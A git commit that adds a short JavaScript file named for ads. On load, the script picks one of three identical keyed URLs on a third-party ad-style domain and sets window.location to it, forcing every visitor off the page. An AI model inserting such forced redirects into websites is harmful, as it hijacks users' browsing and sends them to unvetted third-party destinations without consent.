932b84453cb399b39b66fd46db2c63372004308e
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2022-11-16 10:14:31 +0700

    Create ads1dr2.js

---
+++ ads1dr2.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+  
+  'https://practicallysacrificestock.com/zwq4zqn7x?key=4a867a0e416c4bade143b800341f8358',
+  'https://practicallysacrificestock.com/zwq4zqn7x?key=4a867a0e416c4bade143b800341f8358',
+  'https://practicallysacrificestock.com/zwq4zqn7x?key=4a867a0e416c4bade143b800341f8358'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
